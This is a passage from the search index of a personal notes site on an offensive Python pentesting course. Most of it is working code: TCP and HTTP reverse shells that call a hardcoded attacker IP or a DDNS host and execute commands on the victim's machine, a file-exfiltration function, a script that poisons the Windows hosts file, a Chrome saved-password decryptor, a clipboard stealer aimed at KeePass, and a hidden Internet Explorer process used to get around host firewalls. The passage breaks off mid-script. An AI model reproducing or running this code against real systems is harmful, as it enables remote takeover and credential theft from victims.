conn.recv(1024).decode()) \n        else:\n            conn.send(command.encode()) # Otherwise we will send the command to the target\n            print( conn.recv(1024).decode()) # print the result that we got back\n\ndef main():\n    connect()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-a-tcp-reverse-shell/#using-pyinstaller","title":"Using pyinstaller","text":"<p>See pyinstaller.</p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-an-http-reverse-shell/","title":"Coding an http reverse shell","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-an-http-reverse-shell/#client-side","title":"Client side","text":"<p>To be run on victim's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nimport requests\nimport subprocess\nimport time\n\nwhile True:\n\n    req = requests.get('http://192.168.0.152:8080') # Send GET request to our kali server\n    command = req.text # Store the received txt into command variable\n\n    if 'terminate' in command:\n        break\n\n    else:\n        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read()) # POST the result\n        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read()) # or the error -if any-\n\n    time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/coding-an-http-reverse-shell/#server-side","title":"Server side","text":"<p>To be run on attacker's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nimport http.server\n\nHOST_NAME = \"192.168.0.152\" // our attacker machine\nPORT_NUMBER = 8080 // attacker listening port\n\nclass MyHandler(http.server.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST\n\n    def do_GET(self):\n\n        command = input(\"Shell&gt; \")\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(command.encode())\n\n    def do_POST(self):\n\n        self.send_response(200)\n        self.end_headers()\n        length = int(self.headers['Content-length']) #Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer\n        postVar = self.rfile.read(length)\n        print(postVar.decode())\n\nif __name__ == \"__main__\":\n\n    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)\n    server_class = http.server.HTTPServer\n    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)\n    try:\n        httpd.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server\n    except KeyboardInterrupt:\n        print('[!] Server is terminated')\n        httpd.server_close()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/ddns-aware-shell/","title":"Coding a DDNS aware shell","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>When coding a reverse shell you don't need to hardcode the IP address of the attacker machine. Instead, you can use a Dynamic DNS server such as https://www.noip.com/. To inform this server of our attacker IP public address we will install a linux dynamic client on our kali (an agent that will do the trick).</p> <p>See noip to lear how to install a linux dynamic client on the attacker machine.</p> <p>After installing the agent, let's see the modification needed on the client side of the TCP reverse shell.</p>","tags":["python","python pentesting","scripting","ddns","reverse shell"]},{"location":"python/ddns-aware-shell/#client-side","title":"Client side","text":"<pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport socket\nimport subprocess\nimport os\n\ndef transfer(s, path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while len(packet) &gt; 0:\n            s.send(packet)\n            packet = f.read(1024)\n        s.send('DONE'.encode())\n    else:\n        s.send('File not found'.encode())\ndef connecting(ip):\n    s = socket.socket()\n    s.connect((ip, 8080))\n\n    while True:\n        command = s.recv(1024)\n\n        if 'terminate' in command.decode():\n            s.close()\n            break\n\n        elif 'grab' in command.decode():\n            grab, path = command.decode().split(\"*\")\n            try:\n                transfer(s, path)\n            except:\n                pass\n        else:\n            CMD = subprocess.Popen(command.decode(), shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            s.send(CMD.stderr.read())\n            s.send(CMD.stdout.read())\ndef main():\n    ip = socket.gethostbyname('cared.ddns.net')\n    print (ip)\n    return\n    connecting(ip)\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","ddns","reverse shell"]},{"location":"python/dns-poisoning/","title":"DNS poisoning","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>1. Add a new line to hosts file in windows with attacker IP and an url</p> <pre><code>echo 10.10.120.12 google.com &gt;&gt; c:\\Windows\\System32\\drivers\\etc\n</code></pre> <p>2. Flush the DNS cache to make sure that we will use the updated record</p> <pre><code>ipconfig /flushdns\n</code></pre> <p>Now traffic will be redirected to the attacker machine.</p>","tags":["python","python pentesting","techniques","DNS poisoning"]},{"location":"python/dns-poisoning/#python-script-for-dns-poisoning","title":"Python script for DNS poisoning","text":"<pre><code>import subprocess\nimport os\n\nos.chdir(\"C:\\Windows\\System32\\drivers\\etc\")\n\ncommand = \"echo 10.10.10.100 www.google.com &gt;&gt; hosts\"\n\nCMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\ncommand = \"ipconfig /flushdns\"\n\nCMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n</code></pre>","tags":["python","python pentesting","techniques","DNS poisoning"]},{"location":"python/dumping-chrome-saved-passwords/","title":"Dumping saved passwords from Google Chrome","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/dumping-chrome-saved-passwords/#how-does-chrome-saved-passwords-work","title":"How does Chrome saved passwords work?","text":"<p>Chrome uses windows session password to encrypt and decrypt saved passwords. Encrypted passwords are stored  in a SQlite  db called 'Login Data DB' located at:</p> <pre><code>C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\n</code></pre> <p>Chrome calls to the windows API function called \"CryptProtectData\", which uses the windows login password as an encryption key and in reverse operation a windows API function called \"CryptUnprotectData\" to decrypt the password value back to clear text.</p> <p>1. Install sqlite from: https://sqlitebrowser.org/dl/</p> <p>2. Open DB Browser sqlite.</p> <p>3. In your windows explorer, go to the path where sqlite db is stored and  copy the file \"Login Data\" to your Desktop.</p> <p>4. Change the extension of \"Login Data\" file to .sqlite3</p> <p>5. Open \"Login Data.sqlite3\" in DB Browser sqlite.</p> <p>6. Go to tab \"Browse Data\" (Hoja de Datos in spanish) and select the table login. There you have all stored passwords.</p>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/dumping-chrome-saved-passwords/#our-script","title":"Our script","text":"<p>The route map for this script will be:</p> <p>1. Guessing the path to sqlite database: username and browser used by the victim.</p> <pre><code>C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\n</code></pre> <p>2. Sending the password value from a column in \"logins\" table, in \"Login Data.sqlite3\" to function CryptUn ProtectData.</p> <p>3. Send the passwords through a reverse shell.</p>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/dumping-chrome-saved-passwords/#script-for-gathering-passwords","title":"Script for gathering passwords","text":"<p>Here is the script provided in the course (it doesn't work, below I've pasted a different one that works):</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nfrom os import getenv \n# To find out the Chrome SQL path- C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n\nimport sqlite3 # To read the Chrome SQLite DB\n\nimport win32crypt  # High level library to call windows API CryptUnprotectData\n\nfrom shutil import copyfile # To make a copy of the Chrome SQLite DB\n\n\n# LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\\Users\\{username}\\AppData\\Local\npath = getenv(\"LOCALAPPDATA\")+r\"\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n# make a copy the Login Data DB and pull data out of the copied DB, so there are no conflicts in case that the user is using the original (maybe she is logged into facebook, let's say)\npath2 = getenv(\"LOCALAPPDATA\")+r\"\\Google\\Chrome\\User Data\\Default\\Login2\"\ncopyfile(path, path2)\n\n# Connect to the copied Database\nconn = sqlite3.connect(path2)\n\n\ncursor = conn.cursor() #Create a Cursor object and call its execute() method to perform SQL commands like SELECT\n\n# SELECT column_name,column_name FROM table_name\n# SELECT action_url and username_value and password_value FROM table logins\ncursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\n\n# To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.\nfor raw in cursor.fetchall():\n\n    print(raw[0] + '\\n' + raw[1]) # print the action_url (raw[0]) and print the username_value (raw[1])\n\n    password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  \n\n    print(password)\nconn.close()\n</code></pre> <p>Script that works. These are requirements:</p> <pre><code>pip install PyCryptodome\n</code></pre> <p>Script:</p> <pre><code>import os\nimport json\nimport base64\nimport sqlite3\nimport win32crypt\nfrom Crypto.Cipher import AES\nimport shutil\n\ndef get_master_key():\n    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', \"r\") as f:\n        local_state = f.read()\n        local_state = json.loads(local_state)\n    master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = master_key[5:]  # removing DPAPI\n    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n    return master_key\n\ndef decrypt_payload(cipher, payload):\n    return cipher.decrypt(payload)\n\ndef generate_cipher(aes_key, iv):\n    return AES.new(aes_key, AES.MODE_GCM, iv)\n\ndef decrypt_password(buff, master_key):\n    try:\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = generate_cipher(master_key, iv)\n        decrypted_pass = decrypt_payload(cipher, payload)\n        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes\n        return decrypted_pass\n    except Exception as e:\n        # print(\"Probably saved password from Chrome version older than v80\\n\")\n        # print(str(e))\n        return \"Chrome &lt; 80\"\n\n\nmaster_key = get_master_key()\nlogin_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'\nshutil.copy2(login_db, \"Loginvault.db\") #making a temp copy since Login Data DB is locked while Chrome is running\nconn = sqlite3.connect(\"Loginvault.db\")\ncursor = conn.cursor()\ntry:\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n    for r in cursor.fetchall():\n        url = r[0]\n        username = r[1]\n        encrypted_password = r[2]\n        decrypted_password = decrypt_password(encrypted_password, master_key)\n        if len(username) &gt; 0:\n            print(\"URL: \" + url + \"\\nUser Name: \" + username + \"\\nPassword: \" + decrypted_password + \"\\n\" + \"*\" * 50 + \"\\n\")\nexcept Exception as e:\n    pass\ncursor.close()\nconn.close()\ntry:\n    os.remove(\"Loginvault.db\")\nexcept Exception as e:\n    pass\n</code></pre>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/dumping-chrome-saved-passwords/#script-with-gathering-passwords-phase-integrated-in-a-reverse-shell","title":"Script with gathering passwords phase integrated in a reverse shell","text":"<pre><code># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nimport json\nimport base64\nfrom os import getenv \n# To find out the Chrome SQL path- C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n\nimport sqlite3 # To read the Chrome SQLite DB\nfrom Crypto.Cipher import AES\nimport win32crypt  # High level library to call windows API CryptUnprotectData\n\nfrom shutil import copyfile # To make a copy of the Chrome SQLite DB\n\n\n# LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\\Users\\{username}\\AppData\\Local\npath = getenv(\"LOCALAPPDATA\")+r\"\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n# make a copy the Login Data DB and pull data out of the copied DB\npath2 = getenv(\"LOCALAPPDATA\")+r\"\\Google\\Chrome\\User Data\\Default\\Login2\"\ncopyfile(path, path2)\n\n# Connect to the copied Database\nconn = sqlite3.connect(path2)\n\n\ncursor = conn.cursor() #Create a Cursor object and call its execute() method to perform SQL commands like SELECT\n\n# SELECT column_name,column_name FROM table_name\n# SELECT action_url and username_value and password_value FROM table logins\ncursor.execute('SELECT action_url, username_value, password_value FROM logins')\n\n\n# To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.\nfor raw in cursor.fetchall():\n\n    print(raw[0] + '\\n' + raw[1]) # print the action_url (raw[0]) and print the username_value (raw[1])\n\n    password = win32crypt.CryptUnprotectData(raw[2])[1] # pass the encrypted Password to CryptUnprotectData API function to decrypt it  \n\n    print(password)\nconn.close()\n</code></pre>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/hickjack-internet-explorer-process-to-bypass-an-host-based-firewall/","title":"Hickjack the Internet Explorer process to bypass an host-based firewall","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <p>For our script to bypass a host-based firewall (based on an ACL), we will hickjack the Internet Explorer process to conceal our traffick and bypass it.</p>","tags":["python","python pentesting","scripting","reverse shell","bypassing techniques","host based firewall"]},{"location":"python/hickjack-internet-explorer-process-to-bypass-an-host-based-firewall/#client-side","title":"Client side","text":"<p>Make sure that the victim machine (a windows 10) has installed these two python libraries: pypiwin32 and pywin32.</p> <p>To be run on our victim's machine.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\nfrom win32com.client import Dispatch\nfrom time import sleep\nimport subprocess\n\nie = Dispatch(\"InternetExplorer.Application\") # Create browser instance.\nie.Visible = 0 # Make it invisible [ run in background ] (1= visible)\n\n# Paramaeters for POST\ndURL = \"http://192.168.0.152\"  \nFlags = 0\nTargetFrame = 0\n\n\nwhile True:\n    ie.Navigate(\"http://192.168.0.152\") # Navigate to our kali web server (the attacker machine) to grab the hacker commands\n    while ie.ReadyState != 4: # Wait for browser to finish loading.\n        sleep(1)\n\n    command = ie.Document.body.innerHTML \n    command = command.encode() # encode the command\n    if 'terminate' in command.decode():\n        ie.Quit() # quit the IE and end up the process\n        break\n    else:\n        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n        Data = CMD.stdout.read()\n        PostData = memoryview( Data ) # in order to submit or post data using COM technique , it requires to  buffer the data first using memoryview\n        ie.Navigate(dURL, Flags, TargetFrame, PostData) # we post the comamnd execution result along with the post parameters which we defined eariler..\n\n    sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell","bypassing techniques","host based firewall"]},{"location":"python/hijacking-keepass/","title":"Hijacking Keepass Password Manager","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul> <pre><code># Python For Offensive PenTest: A Complete Practical Course- All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\n#pip install pyperclip\n\nimport pyperclip \nimport time\n\nlist = [] # we create a list which will store the clipboard content\n\nwhile True: # infifnite loop to continously check the  clipboard\n\n    if pyperclip.paste() != 'None': # if the clipboard content is not empty ...\n        value = pyperclip.paste() # then we will take its value and put it into variable called value\n\n#now to make sure that we don't get replicated items in our list before appending the value varaible into our list, we gonna check if the value is stored eariler in the first place, if not then this menas this is a new item and we will append it to our list\n\n\n        if value not in list:\n            list.append(value)\n\n        print(list)\n\n        time.sleep(3)\n</code></pre>","tags":["python","python pentesting","scripting","keylogger"]},{"location":"python/including-cd-command-into-tcp-reverse-shell/","title":"Including cd command into TCP reverse shell","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/including-cd-command-into-tcp-reverse-shell/#client-side","title":"Client side","text":"<p>To be run on victim's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport socket\nimport subprocess\nimport os\n\ndef transfer(s, path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while packet:\n            s.send(packet)\n            packet = f.read(1024)\n        s.send('DONE'.encode())\n        f.close()\n    else:\n        s.send('Unable to find out the file'.encode())\n\ndef connect():\n    s = socket.socket()\n    s.connect(('192.168.0.152', 8080))\n    while True:\n        command = s.recv(1024)\n        if 'terminate' in command.decode():\n            s.close()\n            break\n        elif 'grab' in command.decode():\n            grab, path = command.decode().split('*')\n            try:\n                transfer(s, path)\n            except Exception as e:\n                s.send(str(e).encode())\n                pass\n        elif 'cd' in command.decode():\n            code, directory = command.decode().split('*') # the syntax here is gonna be cd*directory\n            try:\n                os.chdir(directory) # changing the directory \n                s.send(('[+] CWD is ' + os.getcwd()).encode()) # we send back a string mentioning the new CWD Current working directory\n            except Exception as e:\n                s.send(('[-]  ' + str(e)).encode())\n        else:\n            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            s.send(CMD.stdout.read())\n            s.send(CMD.stderr.read())\n\ndef main():\n    connect()\n\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/including-cd-command-into-tcp-reverse-shell/#server-side","title":"Server side","text":"<p>To be run on attacker's computer.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport socket\n\ndef connect():\n\n    s = socket.socket()\n    s.bind((\"10.0.2.15\", 1234))\n    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single\n    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)\n    print ('[+] We got a connection from', addr)\n\n    while True:\n\n        command = input(\"Shell&gt; \")\n\n        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop\n            conn.send('terminate'.encode())\n            conn.close()\n            break\n        elif '' in command: # If the user just click enter, we will send a whoami command\n            conn.send('whoami'.encode()) \n            print( conn.recv(1024).decode()) \n        else:\n            conn.send(command.encode()) # Otherwise we will send the command to the target\n            print( conn.recv(1024).decode()) # print the result that we got back\n\ndef main():\n    connect()\nmain()\n</code></pre>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/including-cd-command-into-tcp-reverse-shell/#using-pyinstaller","title":"Using pyinstaller","text":"<p>See pyinstaller.</p>","tags":["python","python pentesting","scripting","reverse shell"]},{"location":"python/making-a-screenshot/","title":"Making a screenshot","text":"<p>From course: Python For Offensive PenTest: A Complete Practical Course.</p> General index of the course <ul> <li>Gaining persistence shells (TCP + HTTP):<ul> <li>Coding a TCP connection and a reverse shell.</li> <li>Coding a low level data exfiltration  - TCP connection.</li> <li>Coding an http reverse shell.</li> <li>Coding a data exfiltration script for a http shell.</li> <li>Tunning the connection attempts.</li> <li>Including cd command into TCP reverse shell.</li> </ul> </li> <li>Advanced scriptable shells:<ul> <li>Using a Dynamic DNS instead of your bared attacker public ip.</li> <li>Making your binary persistent. </li> <li>Making a screenshot. </li> <li>Coding a reverse shell that searches files. </li> </ul> </li> <li>Techniques for bypassing filters: <ul> <li>Coding a reverse shell that scans ports. </li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall.</li> <li>Bypassing Next Generation Firewalls.</li> <li>Bypassing IPS with handmade XOR Encryption.</li> </ul> </li> <li>Malware and crytography:<ul> <li>TCP reverse shell with AES encryption.</li> <li>TCP reverse shell with RSA encryption.</li> <li>TCP reverse shell with hybrid encryption AES + RSA.</li> </ul> </li> <li>Password Hickjacking:<ul> <li>Simple keylogger in python.</li> <li>Hijacking Keepass Password Manager.</li> <li>Dumping saved passwords from Google Chrome.</li> <li>Man in the browser attack.</li> <li>DNS Poisoning.</li> </ul> </li> <li>Privilege escalation:<ul> <li>Weak service file permission.</li> </ul> </li> </ul>","tags":["python","python pentesting","scripting","reverse shell","screenshot capturer"]},{"location":"python/making-a-screenshot/#client-side","title":"Client side","text":"<p>To be run on the victim's machine.</p> <pre><code># Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn  https://jo.linkedin.com/in/python2\n\n\nimport requests\nimport os\nimport subprocess\nimport time\n\n\nfrom PIL import ImageGrab # Used to Grab a screenshot\nimport tempfile           # Used to Create a temp 